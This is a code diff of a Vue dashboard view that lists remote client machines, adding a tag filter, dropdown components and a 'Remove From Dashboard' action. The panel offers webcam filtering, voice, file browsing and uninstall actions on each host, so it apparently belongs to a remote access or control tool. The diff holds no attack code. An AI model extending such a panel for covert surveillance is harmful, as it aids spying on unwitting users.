@@ -3,6 +3,7 @@ import { ref, computed, onMounted, onUnmounted } from "vue";
 import { useRouter } from "vue-router";
 import { clientApi, groupApi } from "@/api/client";
 import type { Client, Group } from "@/api/types";
+import AppSelect from "../components/ui/AppSelect.vue";
 import { useWebSocket } from "@/composables/useWebSocket";
 import { useUiStore } from "@/stores/ui";
 import { timeAgo } from "@/lib/format";
@@ -24,6 +25,7 @@ const statusFilter = ref("");
 const osFilter = ref("");
 const groupFilter = ref("");
 const webcamFilter = ref("");
+const tagFilter = ref("");
 const sortBy = ref("last_seen_desc");
 const layout = ref<"cards" | "rows" | "table">("rows");
 
@@ -98,6 +100,7 @@ async function fetchClients() {
     if (osFilter.value) params.os = osFilter.value;
     if (groupFilter.value) params.group = groupFilter.value;
     if (webcamFilter.value) params.webcam = webcamFilter.value;
+    if (tagFilter.value) params.tag = tagFilter.value;
     const res = await clientApi.list(params);
     clients.value = res.items || [];
     total.value = res.total;
@@ -107,6 +110,18 @@ async function fetchClients() {
 
 async function fetchGroups() {
   try { groups.value = await groupApi.list(); } catch { /* silent */ }
+}
+
+async function removeClient(client: Client) {
+  try {
+    await clientApi.removeClient(client.id);
+    clients.value = clients.value.filter((c) => c.id !== client.id);
+    total.value = Math.max(0, total.value - 1);
+    if (client.online) onlineCount.value = Math.max(0, onlineCount.value - 1);
+    ui.toast(`Removed ${client.host} from dashboard`, "success");
+  } catch (err: any) {
+    ui.toast(err.message || "Failed to remove client", "error");
+  }
 }
 
 function prevPage() { if (page.value > 1) { page.value--; fetchClients(); } }
@@ -146,6 +161,7 @@ function ctxAction(key: string) {
   else if (key === "filebrowser") router.push({ name: "filebrowser", params: { id: client.id } });
   else if (key === "voice") router.push({ name: "voice", params: { id: client.id } });
   else if (key === "winre") router.push({ name: "winre", params: { id: client.id } });
+  else if (key === "remove-dashboard") removeClient(client);
 }
 
 onMounted(() => {
@@ -180,34 +196,12 @@ onUnmounted(() => {
           placeholder="Search..."
           class="input toolbar-search"
         />
-        <select v-model="statusFilter" @change="resetAndFetch" class="input toolbar-select">
-          <option value="">All Status</option>
-          <option value="online">Online</option>
-          <option value="offline">Offline</option>
-        </select>
-        <select v-model="osFilter" @change="resetAndFetch" class="input toolbar-select">
-          <option value="">All OS</option>
-          <option value="windows">Windows</option>
-          <option value="linux">Linux</option>
-          <option value="darwin">macOS</option>
-        </select>
-        <select v-model="groupFilter" @change="resetAndFetch" class="input toolbar-select">
-          <option value="">All Groups</option>
-          <option v-for="g in groups" :key="g.id" :value="g.name">{{ g.name }}</option>
-        </select>
-        <select v-model="webcamFilter" @change="resetAndFetch" class="input toolbar-select">
-          <option value="">All Webcams</option>
-          <option value="true">Has Webcam</option>
-        </select>
-        <select v-model="sortBy" @change="resetAndFetch" class="input toolbar-select">
-          <option value="last_seen_desc">Last Seen</option>
-          <option value="stable">Stable</option>
-          <option value="host_asc">Hostname A-Z</option>
-          <option value="ping_asc">Ping Low</option>
-          <option value="ping_desc">Ping High</option>
-          <option value="country_asc">Country</option>
-          <option value="group_asc">Group</option>
-        </select>
+        <AppSelect v-model="statusFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Status' }, { value: 'online', label: 'Online' }, { value: 'offline', label: 'Offline' }]" size="sm" style="width:130px" />
+        <AppSelect v-model="osFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All OS' }, { value: 'windows', label: 'Windows' }, { value: 'linux', label: 'Linux' }, { value: 'darwin', label: 'macOS' }]" size="sm" style="width:120px" />
+        <AppSelect v-model="groupFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Groups' }, ...groups.map(g => ({ value: g.name, label: g.name }))]" size="sm" style="width:140px" searchable />
+        <AppSelect v-model="webcamFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Webcams' }, { value: 'true', label: 'Has Webcam' }]" size="sm" style="width:130px" />
+        <input v-model="tagFilter" @input="onSearch" placeholder="Filter by tag..." class="input toolbar-select" style="width:130px" />
+        <AppSelect v-model="sortBy" @update:modelValue="resetAndFetch" :options="[{ value: 'last_seen_desc', label: 'Last Seen' }, { value: 'stable', label: 'Stable' }, { value: 'host_asc', label: 'Hostname A-Z' }, { value: 'ping_asc', label: 'Ping Low' }, { value: 'ping_desc', label: 'Ping High' }, { value: 'country_asc', label: 'Country' }, { value: 'group_asc', label: 'Group' }]" size="sm" style="width:130px" />
       </div>
       <div class="layout-toggle">
         <button @click="layout = 'cards'" :class="['layout-btn', layout === 'cards' && 'layout-btn-active']">
@@ -397,6 +391,13 @@ onUnmounted(() => {
           <i class="fa-solid fa-trash" style="width:16px;text-align:center;font-size:12px"></i>
           <span>Uninstall</span>
         </button>
+        <template v-if="ctxMenu.client && !ctxMenu.client.online">
+          <div class="ctx-menu-sep"></div>
+          <button @click="ctxAction('remove-dashboard')" class="ctx-menu-btn ctx-menu-btn-danger" style="color:#fda4af">
+            <i class="fa-solid fa-user-xmark" style="width:16px;text-align:center;font-size:12px"></i>
+            <span>Remove From Dashboard</span>
+          </button>
+        </template>
       </div>
     </Teleport>
   </div>
